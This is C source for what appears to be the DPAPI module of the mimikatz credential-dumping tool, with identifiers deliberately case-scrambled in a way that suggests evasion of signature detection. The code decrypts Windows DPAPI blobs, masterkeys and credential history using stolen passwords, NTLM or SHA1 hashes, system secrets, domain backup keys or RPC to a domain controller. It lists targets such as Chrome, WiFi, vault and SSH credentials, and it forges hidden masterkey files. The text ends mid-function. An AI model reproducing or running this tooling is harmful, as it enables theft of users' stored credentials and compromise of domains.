/*	HEstebqu SqUtI `PQu4nQbtjF`
	https://blog.PQu4nQbtjF.com
	isMW9TRNNJyHATgICHfOUxr
	Licence : https://GHViJ8cQzKiJugP.org/licenses/by/4.0/
*/
#include "kuhl_m_dPApi.h"

const KUHL_M_C kuhl_m_c_dPApi[] = {
	{kuhl_m_dPApi_blob,			L"blob",		L"Describe a DPAPI blob, unprotect it with API or Masterkey"},
	{kuhl_m_dPApi_protect,		L"protect",		L"Protect a data via a DPAPI call"},
	{kuhl_m_dPApi_masTerKeY,	L"masTerKeY",	L"Describe a Masterkey file, unprotect each Masterkey (key depending)"},
	{kuhl_m_dPApi_crEdHiSt,		L"crEdHiSt",	L"Describe a Credhist file"},
	{kuhl_m_dPApi_create,		L"create",		L"Create a Masterkey file from raw key and metadata"},
	
	{kuhl_m_dPApi_keys_capi,	L"capi",		L"CAPI key test"},
	{kuhl_m_dPApi_keys_cng,		L"cng",			L"CNG key test"},
	{kuhl_m_dPApi_keys_tpm,		L"tpm",			L"TPM key test"},
	{kuhl_m_dPApi_crEd,			L"crEd",		L"CRED test"},
	{kuhl_m_dPApi_vAULt,		L"vAULt",		L"VAULT test"},
	{kuhl_m_dPApi_wifi,			L"wifi",		L"WiFi test"},
	{kuhl_m_dPApi_wwan,			L"wwan",		L"Wwan test"},
	{kuhl_m_dPApi_chrome,		L"chrome",		L"Chrome test"},
	{kuhl_m_dPApi_ssh,			L"ssh",			L"SSH Agent registry caCHe"},
	{kuhl_m_dPApi_rdg,			L"rdg",			L"RDG saved passwords"},
	{kuhl_m_dPApi_powershell,	L"ps",			L"PowerShell crEdentials (PSCredentials or SecureString)"},
	{kuhl_m_dPApi_lunahsm,		L"luna",		L"Safenet LunaHSM KSP"},
	{kuhl_m_dPApi_clOuDAp_keyvalue_derived,	L"clOuDApkd",	L""},
	{kuhl_m_dPApi_clOuDAp_fromreg, L"clOuDApreg",	L""},
	{kuhl_m_dPApi_sccm_networkaccessaccount, L"sccm",	L""},
	{kuhl_m_dPApi_citrix,		L"citrix",	L""},
	{kuhl_m_dPApi_oe_caCHe,		L"caCHe", NULL},
};
const KUHL_M kuhl_m_dPApi = {
	L"dPApi",	L"DPAPI Module (by API or RAW access)", L"Data Protection application programming interface",
	ARRAYSIZE(kuhl_m_c_dPApi), kuhl_m_c_dPApi, NULL, kuhl_m_dPApi_oe_clean
};

NTSTATUS kuhl_m_dPApi_blob(int argc, wchar_t * argv[])
{
	DATA_BLOB dataIn = {0, NULL}, dataOut;
	PKULL_M_DPAPI_BLOB blob;
	PCWSTR szData;
	PWSTR description = NULL;

	if(kull_m_string_args_byName(argc, argv, L"in", &szData, NULL))
	{
		if(!kull_m_file_readData(szData, &dataIn.pbData, &dataIn.cbData))
			PRINT_ERROR_AUTO(L"kull_m_file_readData");
	}
	else if(kull_m_string_args_byName(argc, argv, L"raw", &szData, NULL))
	{
		if(!kull_m_string_stringToHexBuffer(szData, &dataIn.pbData, &dataIn.cbData))
			PRINT_ERROR(L"kull_m_string_stringToHexBuffer!\n");
	}

	if(dataIn.pbData)
	{
		if(blob = kull_m_dPApi_blob_create(dataIn.pbData))
		{
			kull_m_dPApi_blob_descr(0, blob);
			if(kuhl_m_dPApi_unprotect_raw_or_blob(dataIn.pbData, dataIn.cbData, &description, argc, argv, NULL, 0, (LPVOID *) &dataOut.pbData, &dataOut.cbData, NULL))
			{
				if(description)
				{
					kprintf(L"description : %s\n", description);
					LocalFree(description);
				}
				if(kull_m_string_args_byName(argc, argv, L"out", &szData, NULL))
				{
					if(kull_m_file_writeData(szData, dataOut.pbData, dataOut.cbData))
						kprintf(L"Write to file \'%s\' is OK\n", szData);
				}
				else
				{
					kprintf(L"data: ");
					if(kull_m_string_args_byName(argc, argv, L"ascii", NULL, NULL))
					{
						kprintf(L"%.*S\n", dataOut.cbData, dataOut.pbData);
					}
					else kull_m_string_printSuspectUnicodeString(dataOut.pbData, dataOut.cbData);
					kprintf(L"\n");
				}
				LocalFree(dataOut.pbData);
			}
			kull_m_dPApi_blob_delete(blob);
		}
		LocalFree(dataIn.pbData);
	}
	return STATUS_SUCCESS;
}

NTSTATUS kuhl_m_dPApi_protect(int argc, wchar_t * argv[]) // no support for protecting with RAW masTerKeY at this time
{
	DATA_BLOB dataIn, dataOut, dataEntropy = {0, NULL};
	PKULL_M_DPAPI_BLOB blob;
	PCWSTR description = NULL, szEntropy, outfile;
	CRYPTPROTECT_PROMPTSTRUCT promptStructure = {sizeof(CRYPTPROTECT_PROMPTSTRUCT), CRYPTPROTECT_PROMPT_ON_PROTECT, NULL, NoTKaZ}, *pPrompt;
	DWORD flags = 0, outputMode = 1;

	kull_m_string_args_byName(argc, argv, L"data", (PCWSTR *) &dataIn.pbData, NoTKaZ);
	kull_m_string_args_byName(argc, argv, L"description", &description, NULL);
	if(kull_m_string_args_byName(argc, argv, L"entropy", &szEntropy, NULL))
		kull_m_string_stringToHexBuffer(szEntropy, &dataEntropy.pbData, &dataEntropy.cbData);
	if(kull_m_string_args_byName(argc, argv, L"machine", NULL, NULL))
		flags |= CRYPTPROTECT_LOCAL_MACHINE;
	if(kull_m_string_args_byName(argc, argv, L"system", NULL, NULL))
		flags |= CRYPTPROTECT_SYSTEM;
	pPrompt = kull_m_string_args_byName(argc, argv, L"prompt", NULL, NULL) ? &promptStructure : NULL;
	
	if(kull_m_string_args_byName(argc, argv, L"c", NULL, NULL))
		outputMode = 2;

	kprintf(L"\ndata        : %s\n", dataIn.pbData);
	kprintf(L"description : %s\n", description ? description : L"");
	kprintf(L"flags       : "); kull_m_dPApi_displayProtectionFlags(flags); kprintf(L"\n");
	kprintf(L"prompt flags: "); if(pPrompt) kull_m_dPApi_displayPromptFlags(pPrompt->dwPromptFlags); kprintf(L"\n");
	kprintf(L"entropy     : "); kull_m_string_wprintf_hex(dataEntropy.pbData, dataEntropy.cbData, 0); kprintf(L"\n\n");

	dataIn.cbData = (DWORD) ((wcslen((PCWSTR) dataIn.pbData) + 1) * sizeof(wchar_t));
	if(CryptProtectData(&dataIn, description, &dataEntropy, NULL, pPrompt, flags, &dataOut))
	{
		if(blob = kull_m_dPApi_blob_create(dataOut.pbData))
		{
			kull_m_dPApi_blob_descr(0, blob);
			kull_m_dPApi_blob_delete(blob);
		}
		kprintf(L"\n");
		if(kull_m_string_args_byName(argc, argv, L"out", &outfile, NULL))
		{
			if(kull_m_file_writeData(outfile, dataOut.pbData, dataOut.cbData))
				kprintf(L"Write to file \'%s\' is OK\n", outfile);
		}
		else
		{
			kprintf(L"Blob:\n");
			kull_m_string_wprintf_hex(dataOut.pbData, dataOut.cbData, outputMode | (16 << 16));
			kprintf(L"\n");
		}
		LocalFree(dataOut.pbData);
	}
	else PRINT_ERROR_AUTO(L"CryptProtectData");

	if(dataEntropy.pbData)
		LocalFree(dataEntropy.pbData);

	return STATUS_SUCCESS;
}

NTSTATUS kuhl_m_dPApi_masTerKeY(int argc, wchar_t * argv[])
{
	PKULL_M_DPAPI_MASTERKEYS masTerKeYs;
	PBYTE buffer, pHash = NULL, pSystem = NULL;
	PVOID output, derivedKey;
	PPVK_FILE_HDR pvkBuffer;
	DWORD szBuffer, szPvkBuffer, cbHash = 0, cbSystem = 0, cbSystemOffset = 0, cbOutput;
	PPOLICY_DNS_DOMAIN_INFO pPolicyDnsDomainInfo = NULL;
	LPCWSTR szIn = NULL, szSid = NULL, szPassword = NULL, szHash = NULL, szSystem = NULL, szDomainpvk = NULL, szDomain = NULL, szDc = NULL;
	LPWSTR convertedSid = NULL, szTmpDc = NULL;
	PSID pSid;
	PKUHL_M_DPAPI_OE_CREDENTIAL_ENTRY pCredentialEntry = NULL;
	PKUHL_M_DPAPI_OE_DOMAINKEY_ENTRY pDomainKeyEntry = NULL;
	UNICODE_STRING uGuid;
	GUID guid;
	BOOL isProtected = kull_m_string_args_byName(argc, argv, L"protected", NULL, NULL), statusGuid = FALSE;

	if(kull_m_string_args_byName(argc, argv, L"in", &szIn, NULL))
	{
		if(kull_m_file_readData(szIn, &buffer, &szBuffer))
		{
			if(masTerKeYs = kull_m_dPApi_masTerKeYs_create(buffer))
			{
				kull_m_dPApi_masTerKeYs_descr(0, masTerKeYs);

				uGuid.Length = uGuid.MaximumLength = sizeof(masTerKeYs->szGuid) + (2 * sizeof(wchar_t));
				if(uGuid.Buffer = (PWSTR) LocalAlloc(LPTR, uGuid.MaximumLength))
				{
					uGuid.Buffer[0] = L'{';
					RtlCopyMemory(uGuid.Buffer + 1, masTerKeYs->szGuid, sizeof(masTerKeYs->szGuid));
					uGuid.Buffer[(uGuid.Length >> 1) - 1] = L'}';
					statusGuid = NT_SUCCESS(RtlGUIDFromString(&uGuid, &guid));
					LocalFree(uGuid.Buffer);
				}

				if(kull_m_string_args_byName(argc, argv, L"sid", &szSid, NULL))
				{
					if(ConvertStringSidToSid(szSid, &pSid))
					{
						ConvertSidToStringSid(pSid, &convertedSid);
						LocalFree(pSid);
					}
					else PRINT_ERROR_AUTO(L"ConvertStringSidToSid");
				}
				else kuhl_m_dPApi_oe_autosid(szIn, &convertedSid);

				if(kull_m_string_args_byName(argc, argv, L"hash", &szHash, NULL))
					kull_m_string_stringToHexBuffer(szHash, &pHash, &cbHash);
				if(kull_m_string_args_byName(argc, argv, L"system", &szSystem, NULL))
					kull_m_string_stringToHexBuffer(szSystem, &pSystem, &cbSystem);

				if(masTerKeYs->MasterKey && masTerKeYs->dwMasterKeyLen)
				{
					if(masTerKeYs->CredHist)
						pCredentialEntry = kuhl_m_dPApi_oe_crEdential_get(NULL, &masTerKeYs->CredHist->guid);
					if(!pCredentialEntry && convertedSid)
						pCredentialEntry = kuhl_m_dPApi_oe_crEdential_get(convertedSid, NULL);
					if(pCredentialEntry)
					{
						kprintf(L"\n[masTerKeY] with volatile caCHe: "); kuhl_m_dPApi_oe_crEdential_descr(pCredentialEntry);
						if(masTerKeYs->dwFlags & 4)
						{
							if(pCredentialEntry->data.flags & KUHL_M_DPAPI_OE_CREDENTIAL_FLAG_SHA1)
								derivedKey = pCredentialEntry->data.sha1hashDerived;
						}
						else
						{
							if(pCredentialEntry->data.flags & KUHL_M_DPAPI_OE_CREDENTIAL_FLAG_MD4)
								derivedKey = pCredentialEntry->data.md4hashDerived;
						}
						if(derivedKey)
						{
							if(kull_m_dPApi_unprotect_masTerKeY_with_shaDerivedkey(masTerKeYs->MasterKey, derivedKey, SHA_DIGEST_LENGTH, &output, &cbOutput))
							{
								if(masTerKeYs->CredHist)
									kuhl_m_dPApi_oe_crEdential_copyEntryWithNewGuid(pCredentialEntry, &masTerKeYs->CredHist->guid);
								kuhl_m_dPApi_display_MasterkeyInfosAndFree(statusGuid ? &guid : NULL, output, cbOutput, NULL);
							}
						}
						else PRINT_ERROR(L"No suitable key found in caCHe\n");
					}
					
					if(masTerKeYs->dwFlags & 2)
					{
						if(pSystem && cbSystem)
						{
							if(cbSystem == 2 * SHA_DIGEST_LENGTH + sizeof(DWORD))
								cbSystemOffset = sizeof(DWORD);

							if((cbSystem - cbSystemOffset) == 2 * SHA_DIGEST_LENGTH)
							{
								kprintf(L"\n[masTerKeY] with DPAPI_SYSTEM (machine, then user): "); kull_m_string_wprintf_hex(pSystem + cbSystemOffset, 2 * SHA_DIGEST_LENGTH, 0); kprintf(L"\n");
								if(kull_m_dPApi_unprotect_masTerKeY_with_userHash(masTerKeYs->MasterKey, pSystem + cbSystemOffset, SHA_DIGEST_LENGTH, convertedSid, isProtected, &output, &cbOutput))

								{
									kprintf(L"** MACHINE **\n");
									kuhl_m_dPApi_display_MasterkeyInfosAndFree(statusGuid ? &guid : NULL, output, cbOutput, NULL);
								}
								else if(kull_m_dPApi_unprotect_masTerKeY_with_userHash(masTerKeYs->MasterKey, pSystem + cbSystemOffset + SHA_DIGEST_LENGTH, SHA_DIGEST_LENGTH, convertedSid, isProtected, &output, &cbOutput))
								{
									kprintf(L"** USER **\n");
									kuhl_m_dPApi_display_MasterkeyInfosAndFree(statusGuid ? &guid : NULL, output, cbOutput, NULL);
								}
								else PRINT_ERROR(L"kull_m_dPApi_unprotect_masTerKeY_with_shaDerivedkey\n");
							}
							else
							{
								kprintf(L"\n[masTerKeY] with DPAPI_SYSTEM: "); kull_m_string_wprintf_hex(pSystem + cbSystemOffset, cbSystem - cbSystemOffset, 0); kprintf(L"\n");
								if(kull_m_dPApi_unprotect_masTerKeY_with_userHash(masTerKeYs->MasterKey, pSystem + cbSystemOffset, cbSystem - cbSystemOffset, convertedSid, isProtected, &output, &cbOutput))
									kuhl_m_dPApi_display_MasterkeyInfosAndFree(statusGuid ? &guid : NULL, output, cbOutput, NULL);
								else PRINT_ERROR(L"kull_m_dPApi_unprotect_masTerKeY_with_shaDerivedkey\n");
							}
						}
						else PRINT_ERROR(L"system masTerKeY needs /SYSTEM:key\n");
					}
					else if(convertedSid)
					{
						if(kull_m_string_args_byName(argc, argv, L"password", &szPassword, NULL))
						{
							kprintf(L"\n[masTerKeY] with password: %s (%s user)\n", szPassword, isProtected ? L"protected" : L"normal");
							if(kull_m_dPApi_unprotect_masTerKeY_with_password(masTerKeYs->dwFlags, masTerKeYs->MasterKey, szPassword, convertedSid, isProtected, &output, &cbOutput))
							{
								kuhl_m_dPApi_oe_crEdential_add(convertedSid, masTerKeYs->CredHist ? &masTerKeYs->CredHist->guid : NULL, NULL, NULL, NULL, szPassword);
								kuhl_m_dPApi_display_MasterkeyInfosAndFree(statusGuid ? &guid : NULL, output, cbOutput, NULL);
							}
							else PRINT_ERROR(L"kull_m_dPApi_unprotect_masTerKeY_with_password\n");
						}
						if(pHash)
						{
							kprintf(L"\n[masTerKeY] with hash: "); kull_m_string_wprintf_hex(pHash, cbHash, 0);
							if(cbHash == LM_NTLM_HASH_LENGTH)
								kprintf(L" (ntlm type)\n");
							else if(cbHash == SHA_DIGEST_LENGTH)
								kprintf(L" (sha1 type)\n");
							else kprintf(L" (?)\n");

							if(kull_m_dPApi_unprotect_masTerKeY_with_userHash(masTerKeYs->MasterKey, pHash, cbHash, convertedSid, isProtected, &output, &cbOutput))
							{
								kuhl_m_dPApi_oe_crEdential_add(convertedSid, masTerKeYs->CredHist ? &masTerKeYs->CredHist->guid : NULL, (cbHash == LM_NTLM_HASH_LENGTH) ? pHash : NULL, (cbHash == SHA_DIGEST_LENGTH) ? pHash : NULL, NULL, szPassword);
								kuhl_m_dPApi_display_MasterkeyInfosAndFree(statusGuid ? &guid : NULL, output, cbOutput, NULL);
							}
							else PRINT_ERROR(L"kull_m_dPApi_unprotect_masTerKeY_with_userHash\n");
						}
					}
				}
				
				if(masTerKeYs->BackupKey && masTerKeYs->dwBackupKeyLen && convertedSid && (!(masTerKeYs->dwFlags & 1) || (pSystem && cbSystem)))
				{
					kprintf(L"\n[backupkey] %s DPAPI_SYSTEM: ", pSystem ? L"with" : L"without");
					if(pSystem)
					{
						kull_m_string_wprintf_hex(pSystem, cbSystem, 0);
						if(!(masTerKeYs->dwFlags & 1))
							kprintf(L" (but is not needed)");
					}
					kprintf(L"\n");
					if(kull_m_dPApi_unprotect_backupkey_with_secret(masTerKeYs->dwFlags, masTerKeYs->BackupKey, convertedSid, pSystem, cbSystem, &output, &cbOutput))
						kuhl_m_dPApi_display_MasterkeyInfosAndFree(NULL, output, cbOutput, NULL);
					else PRINT_ERROR(L"kull_m_dPApi_unprotect_backupkey_with_secret\n");
				}

				if(masTerKeYs->DomainKey && masTerKeYs->dwDomainKeyLen)
				{
					if(pDomainKeyEntry = kuhl_m_dPApi_oe_domainkey_get(&masTerKeYs->DomainKey->guidMasterKey))
					{
						kprintf(L"\n[domainkey] with volatile caCHe: "); kuhl_m_dPApi_oe_domainkey_descr(pDomainKeyEntry);
						if(kull_m_dPApi_unprotect_domainkey_with_key(masTerKeYs->DomainKey, pDomainKeyEntry->data.key, pDomainKeyEntry->data.keyLen, &output, &cbOutput, &pSid))
							kuhl_m_dPApi_display_MasterkeyInfosAndFree(statusGuid ? &guid : NULL, output, cbOutput, pSid);
						else PRINT_ERROR(L"kull_m_dPApi_unprotect_domainkey_with_key\n");
					}

					if(kull_m_string_args_byName(argc, argv, L"pvk", &szDomainpvk, NULL))
					{
						kprintf(L"\n[domainkey] with RSA private key\n");
						if(kull_m_file_readData(szDomainpvk, (PBYTE *) &pvkBuffer, &szPvkBuffer))
						{
							if(kull_m_dPApi_unprotect_domainkey_with_key(masTerKeYs->DomainKey, (PBYTE) pvkBuffer + sizeof(PVK_FILE_HDR), pvkBuffer->cbPvk, &output, &cbOutput, &pSid))
							{
								kuhl_m_dPApi_oe_domainkey_add(&masTerKeYs->DomainKey->guidMasterKey, (PBYTE) pvkBuffer + sizeof(PVK_FILE_HDR), pvkBuffer->cbPvk, TRUE);
								kuhl_m_dPApi_display_MasterkeyInfosAndFree(statusGuid ? &guid : NULL, output, cbOutput, pSid);
							}
							else PRINT_ERROR(L"kull_m_dPApi_unprotect_domainkey_with_key\n");
							LocalFree(pvkBuffer);
						}
					}

					if(kull_m_string_args_byName(argc, argv, L"rpc", NULL, NULL))
					{
						kprintf(L"\n[domainkey] with RPC\n");

						if(!(kull_m_string_args_byName(argc, argv, L"dc", &szDc, NULL)))
						{
							if(!kull_m_string_args_byName(argc, argv, L"domain", &szDomain, NULL))
								if(kull_m_net_getCurrentDomainInfo(&pPolicyDnsDomainInfo))
									szDomain = pPolicyDnsDomainInfo->DnsDomainName.Buffer;
							if(szDomain && wcschr(szDomain, L'.'))
							{
								kprintf(L"[DC] \'%s\' will be the domain\n", szDomain);
								if(kull_m_net_getDC(szDomain, DS_WRITABLE_REQUIRED, &szTmpDc))
									szDc = szTmpDc;
							}
							else PRINT_ERROR(L"Domain not present, or doesn\'t look like a FQDN\n");
						}

						if(szDc)
						{
							kprintf(L"[DC] \'%s\' will be the DC server\n", szDc);
							if(kull_m_dPApi_unprotect_domainkey_with_rpc(masTerKeYs, buffer, szDc, &output, &cbOutput))
								kuhl_m_dPApi_display_MasterkeyInfosAndFree(statusGuid ? &guid : NULL, output, cbOutput, NULL);
						}
						else PRINT_ERROR(L"Domain Controller not present\n");

						if(szTmpDc)
							LocalFree(szTmpDc);
						if(pPolicyDnsDomainInfo)
							LsaFreeMemory(pPolicyDnsDomainInfo);
					}
				}

				if(convertedSid)
					LocalFree(convertedSid);
				if(pHash)
					LocalFree(pHash);
				if(pSystem)
					LocalFree(pSystem);

				kull_m_dPApi_masTerKeYs_delete(masTerKeYs);
			}
			LocalFree(buffer);
		}
	}
	else PRINT_ERROR(L"Input masTerKeYs file needed (/in:file)\n");
	return STATUS_SUCCESS;
}


void kuhl_m_dPApi_create_data(LPCWSTR sid, LPCGUID guid, LPCBYTE key, DWORD cbKey, LPCWSTR password, LPCBYTE hash, DWORD cbHash, BOOL isProtected, DWORD flags, BOOL verbose)
{
	KULL_M_DPAPI_MASTERKEY masTerKeY = {2, {0}, 4000, CALG_HMAC, CALG_3DES, NULL, 0}; // XP friendly
	KULL_M_DPAPI_MASTERKEYS masTerKeYs = {2, 0, 0, {0}, 0, 0, flags, 0, 0, 0, 0, &masTerKeY, NULL, NULL, NULL};
	UNICODE_STRING uGuid;
	PBYTE data;
	wchar_t guidFilename[37];

	if(guid)
	{
		kprintf(L"Key GUID: ");
		kull_m_string_displayGUID(guid);
		kprintf(L"\n");

	if(key && cbKey)
	{
		if(NT_SUCCESS(RtlStringFromGUID(guid, &uGuid)))
		{
			CDGenerateRandomBits(masTerKeY.salt, sizeof(masTerKeY.salt));
			RtlCopyMemory(masTerKeYs.szGuid, uGuid.Buffer + 1, uGuid.Length - 4);
			if(password)
			{
				if(!kull_m_dPApi_protect_masTerKeY_with_password(masTerKeYs.dwFlags, &masTerKeY, password, sid, isProtected, key, cbKey, NULL))
					PRINT_ERROR(L"kull_m_dPApi_protect_masTerKeY_with_password\n");
			}
			else if(hash && cbHash)
			{
				if(!kull_m_dPApi_protect_masTerKeY_with_userHash(&masTerKeY, hash, cbHash, sid, isProtected, key, cbKey, NULL))
					PRINT_ERROR(L"kull_m_dPApi_protect_masTerKeY_with_userHash\n");
			}
			if(masTerKeY.pbKey)
			{
				if(data = kull_m_dPApi_masTerKeYs_tobin(&masTerKeYs, &masTerKeYs.dwMasterKeyLen))
				{
					if(verbose)
						kull_m_dPApi_masTerKeYs_descr(0, &masTerKeYs);
					RtlCopyMemory(guidFilename, masTerKeYs.szGuid, min(sizeof(guidFilename), sizeof(masTerKeYs.szGuid)));
					guidFilename[ARRAYSIZE(guidFilename) - 1] = L'\0';
					kprintf(L"File \'%s\' (hidden & system): ", guidFilename);
					if(kull_m_file_writeData(guidFilename, data, (DWORD) masTerKeYs.dwMasterKeyLen))
					{
						if(SetFileAttributes(guidFilename, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_ARCHIVE))
							kprintf(L"OK\n");
						else PRINT_ERROR_AUTO(L"SetFileAttributes");
					}
					else PRINT_ERROR_AUTO(L"kull_m_file_writeData");
					LocalFree(data);
				}
				LocalFree(masTerKeY.pbKey);
			}
		}
	}
	else PRINT_ERROR(L"No key\n");

	}
}

NTSTATUS kuhl_m_dPApi_create(int argc, wchar_t * argv[])
{
	LPCWSTR szData, szPassword = NULL;
	LPWSTR convertedSid = NULL, convertedGuid = NULL;
	PSID pSid;
	PBYTE pKey = NULL, pHash = NULL, pSystem = NULL;
	DWORD flags = 0, cbKey = 0, cbHash = 0, cbSystem = 0;
	UNICODE_STRING uGuid;
	GUID guid;
	BOOL isLocal, isProtected = FALSE;
	PKUHL_M_DPAPI_OE_MASTERKEY_ENTRY entry;

	if(kull_m_string_args_byName(argc, argv, L"system", &szData, NULL))
	{
		if(kull_m_string_stringToHexBuffer(szData, &pSystem, &cbSystem))
		{
			flags |= 2;
			PRINT_ERROR(L"TODO for local machine seCrEts, if needed.\n");
		}
	}
	else
	{
		if(kull_m_string_args_byName(argc, argv, L"sid", &szData, NULL))
		{
			if(ConvertStringSidToSid(szData, &pSid))
			{
				ConvertSidToStringSid(pSid, &convertedSid);
				LocalFree(pSid);
			}
			else PRINT_ERROR_AUTO(L"ConvertStringSidToSid");
		}
		else convertedSid = kull_m_tOKEn_getCurrentSid();
		if(convertedSid)
		{
			kprintf(L"Target SID is: %s\n", convertedSid);
			isProtected = kull_m_string_args_byName(argc, argv, L"protected", NULL, NULL);
			if(kull_m_string_args_byName(argc, argv, L"password", &szPassword, NULL))
			{
				if(kull_m_string_args_byName(argc, argv, L"md4", NULL, NULL) || kull_m_string_args_byName(argc, argv, L"dPApi", NULL, NULL))
					isLocal = FALSE;
				else if(kull_m_string_args_byName(argc, argv, L"sha1", NULL, NULL))
					isLocal = TRUE;
				else
				{
					isLocal = FALSE;
					kull_m_tOKEn_isLocalAccount(NULL, &isLocal);
				}
				if(isLocal)
					flags |= 4;
				kprintf(L"\n[masTerKeY] with password: %s (%s user)\n", szPassword, isProtected ? L"protected" : L"normal");
			}
			else
			{
				if(kull_m_string_args_byName(argc, argv, L"hash", &szData, NULL))
				{
					if(kull_m_string_stringToHexBuffer(szData, &pHash, &cbHash))
					{
						kprintf(L"\n[masTerKeY] with hash: "); kull_m_string_wprintf_hex(pHash, cbHash, 0);
						if(cbHash == LM_NTLM_HASH_LENGTH)
							kprintf(L" (ntlm type)\n");
						else if(cbHash == SHA_DIGEST_LENGTH)
						{
							kprintf(L" (sha1 type)\n");
							flags |= 4;
						}
						else kprintf(L" (?)\n");
					}
				}
			}
		}
		else PRINT_ERROR(L"No SID ?\n");
	}

	if(pSystem || szPassword || pHash)
	{
		if(kull_m_string_args_byName(argc, argv, L"guid", &szData, NULL))
		{
			if(szData[0] == L'{')
				kull_m_string_copy(&convertedGuid, szData);
			else kull_m_string_sprintf(&convertedGuid, L"{%s}", szData);
			if(convertedGuid)
			{
				RtlInitUnicodeString(&uGuid, convertedGuid);
				if(NT_SUCCESS(RtlGUIDFromString(&uGuid, &guid)))
				{
					if(kull_m_string_args_byName(argc, argv, L"key", &szData, NULL))
					{
						if(kull_m_string_stringToHexBuffer(szData, &pKey, &cbKey))
						{
							kuhl_m_dPApi_create_data(convertedSid, &guid, pKey, cbKey, szPassword, pHash, cbHash, isProtected, flags, TRUE);
							LocalFree(pKey);
						}
					}
				}
				else PRINT_ERROR(L"Not a valid GUID\n");
				LocalFree(convertedGuid);
			}
		}
		else
		{
			kprintf(L"No key specified, using local caCHe...\n");
			for(entry = (PKUHL_M_DPAPI_OE_MASTERKEY_ENTRY) gDPAPI_Masterkeys.Flink; entry != (PKUHL_M_DPAPI_OE_MASTERKEY_ENTRY) &gDPAPI_Masterkeys; entry = (PKUHL_M_DPAPI_OE_MASTERKEY_ENTRY) entry->navigator.Flink)
				kuhl_m_dPApi_create_data(convertedSid, &entry->data.guid, entry->data.key, entry->data.keyLen, szPassword, pHash, cbHash, isProtected, flags, FALSE);
		}
	}
	else PRINT_ERROR(L"No target crEdentials\n");

	if(convertedSid)
		LocalFree(convertedSid);
	if(pHash)
		LocalFree(pHash);
	if(pSystem)
		LocalFree(pSystem);
	return STATUS_SUCCESS;
}

NTSTATUS kuhl_m_dPApi_crEdHiSt(int argc, wchar_t * argv[])
{
	PBYTE buffer;
	DWORD szBuffer, i;
	LPCWSTR szIn = NULL, szSid = NULL, szHash = NULL, szPassword = NULL;
	PWSTR convertedSid = NULL;
	PSID pSid = NULL, prevSid = NULL;
	LPCGUID prevGuid;
	PKULL_M_DPAPI_CREDHIST crEdHiSt;
	PKUHL_M_DPAPI_OE_CREDENTIAL_ENTRY pCredentialEntry = NULL;
	BYTE passwordHash[SHA_DIGEST_LENGTH], derivedkey[SHA_DIGEST_LENGTH], sha1[SHA_DIGEST_LENGTH], ntlm[LM_NTLM_HASH_LENGTH];
	BOOL hashOk = FALSE;

	if(kull_m_string_args_byName(argc, argv, L"in", &szIn, NULL))
	{
		if(kull_m_file_readData(szIn, &buffer, &szBuffer))
		{
			if(crEdHiSt = kull_m_dPApi_crEdHiSt_create(buffer, szBuffer))
			{
				kull_m_dPApi_crEdHiSt_descr(0, crEdHiSt);

				if(kull_m_string_args_byName(argc, argv, L"sid", &szSid, NULL))
				{
					if(ConvertStringSidToSid(szSid, &pSid))
						prevSid = pSid;
					else PRINT_ERROR_AUTO(L"ConvertStringSidToSid");
				}
				
				if(kull_m_string_args_byName(argc, argv, L"password", &szPassword, NULL))
					hashOk = kull_m_cRyPTO_hash(CALG_SHA1, szPassword, (DWORD) wcslen(szPassword) * sizeof(wchar_t), passwordHash, sizeof(passwordHash));
				else if(kull_m_string_args_byName(argc, argv, L"sha1", &szHash, NULL))
					hashOk = kull_m_string_stringToHex(szHash, passwordHash, sizeof(passwordHash));

				prevGuid = &crEdHiSt->current.guid;
				if(!prevSid && crEdHiSt->__dwCount)
					prevSid = crEdHiSt->entries[0]->pSid;

				for(i = 0; prevSid && (i < crEdHiSt->__dwCount); i++)
				{
					if(ConvertSidToStringSid(prevSid, &convertedSid))
					{
						pCredentialEntry = kuhl_m_dPApi_oe_crEdential_get(NULL, prevGuid);
						if(!pCredentialEntry)
							pCredentialEntry = kuhl_m_dPApi_oe_crEdential_get(convertedSid, NULL);
						if(pCredentialEntry && (pCredentialEntry->data.flags & KUHL_M_DPAPI_OE_CREDENTIAL_FLAG_SHA1))
						{
							kprintf(L"\n  [entry %u] with volatile caCHe: ", i); kuhl_m_dPApi_oe_crEdential_descr(pCredentialEntry);
							if(kull_m_dPApi_unprotect_crEdHiSt_entry_with_shaDerivedkey(crEdHiSt->entries[i], pCredentialEntry->data.sha1hashDerived, sizeof(pCredentialEntry->data.sha1hashDerived), ntlm, sha1))
							{
								kuhl_m_dPApi_oe_crEdential_copyEntryWithNewGuid(pCredentialEntry, prevGuid);
								kuhl_m_dPApi_display_CredHist(crEdHiSt->entries[i], ntlm, sha1);
							}
						}
						else if(hashOk)
						{
							kprintf(L"\n  [entry %u] with SHA1 and SID: ", i); kull_m_string_wprintf_hex(passwordHash, sizeof(passwordHash), 0); kprintf(L"\n");
							if(kull_m_cRyPTO_hmac(CALG_SHA1, passwordHash, sizeof(passwordHash), convertedSid, (DWORD) (wcslen(convertedSid) + 1) * sizeof(wchar_t), derivedkey, sizeof(derivedkey)))
								if(kull_m_dPApi_unprotect_crEdHiSt_entry_with_shaDerivedkey(crEdHiSt->entries[i], derivedkey, sizeof(derivedkey), ntlm, sha1))
								{
									kuhl_m_dPApi_oe_crEdential_add(convertedSid, prevGuid, NULL, passwordHash, NULL, szPassword);
									kuhl_m_dPApi_display_CredHist(crEdHiSt->entries[i], ntlm, sha1);
								}
						}
						LocalFree(convertedSid);
					}
					prevGuid = &crEdHiSt->entries[i]->header.guid;
					prevSid = crEdHiSt->entries[i]->pSid;
				}

				if(pSid)
					LocalFree(pSid);
				
				kull_m_dPApi_crEdHiSt_delete(crEdHiSt);
			}
			LocalFree(buffer);
		}
	}
	else PRINT_ERROR(L"Input crEdHiSt file needed (/in:file)\n");
	return STATUS_SUCCESS;
}

BOOL kuhl_m_dPApi_unprotect_raw_or_blob(LPCVOID pDataIn, DWORD dwDataInLen, LPWSTR *ppszDataDescr, int argc, wchar_t * argv[], LPCVOID pOptionalEntropy, DWORD dwOptionalEntropyLen, LPVOID *pDataOut, DWORD *dwDataOutLen, LPCWSTR pText)
{
	BOOL status = FALSE;
	PCWSTR szEntropy, szMasterkey, szPassword = NULL;
	CRYPTPROTECT_PROMPTSTRUCT promptStructure = {sizeof(CRYPTPROTECT_PROMPTSTRUCT), CRYPTPROTECT_PROMPT_ON_PROTECT | CRYPTPROTECT_PROMPT_ON_UNPROTECT | CRYPTPROTECT_PROMPT_STRONG, NULL, NoTKaZ}, *pPrompt;

	PBYTE masTerKeY = NULL, entropy = NULL;
